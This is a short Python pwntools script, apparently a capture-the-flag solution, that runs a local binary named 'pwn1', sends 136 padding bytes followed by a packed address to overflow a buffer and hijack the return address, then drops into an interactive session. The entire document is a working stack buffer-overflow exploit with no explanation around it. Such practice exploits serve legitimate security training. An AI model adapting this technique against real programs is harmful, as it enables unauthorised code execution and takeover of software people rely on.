from pwn import *
p = process("./pwn1")
payload = b"a"*136 + p64(0x400548)
p.sendline(payload)
p.interactive()
